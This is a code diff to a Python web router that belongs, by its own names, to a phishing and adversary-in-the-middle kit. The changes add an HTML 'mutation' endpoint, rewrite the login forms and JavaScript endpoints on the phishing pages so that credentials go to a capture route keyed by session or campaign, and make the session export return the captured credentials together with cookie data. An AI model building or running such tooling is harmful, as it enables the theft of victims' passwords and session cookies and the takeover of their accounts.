@@ -46,6 +46,18 @@ async def get_guide():
     """
     return HTMLResponse(content=html)
 
+# --- Mutation Preview ---
+@router.post("/mutation/preview")
+async def mutation_preview(payload: Dict[str, str]):
+    html = payload.get("html", "")
+    try:
+        from core.mutation.engine import MutationEngine
+        engine = MutationEngine()
+        mutated = engine.mutate_html(html)
+        return {"mutated": mutated}
+    except Exception:
+        return {"mutated": html}
+
 # --- Smart Redirection & AiTM ---
 
 @router.get("/r/{campaign_id}")
@@ -186,9 +198,11 @@ async def serve_phishing_page(campaign_id: str, request: Request, sid: Optional[
     if sid:
         content = content.replace('<form action="/auth/login" method="POST">', 
                                   f'<form action="/v5/auth/login?sid={sid}" method="POST">')
+        content = content.replace("apiEndpoint: '/auth/login'", f"apiEndpoint: '/v5/auth/login?sid={sid}'")
     else:
         content = content.replace('<form action="/auth/login" method="POST">', 
                                   f'<form action="/v5/auth/login?cid={campaign_id}" method="POST">')
+        content = content.replace("apiEndpoint: '/auth/login'", f"apiEndpoint: '/v5/auth/login?cid={campaign_id}'")
         
     return HTMLResponse(content=content)
 
@@ -209,7 +223,13 @@ async def export_session(session_id: str, format: str = "json"):
         if format == "netscape":
             if not isinstance(data, str):
                 data = str(data)
-            return PlainTextResponse(content=data, media_type="text/plain")
+            return {
+                "session_id": session_id,
+                "format": "netscape",
+                "exported_at": session.get("last_activity", None),
+                "data": data,
+                "credentials": session.get("captured_data", {})
+            }
         
         return {
             "session_id": session_id, 
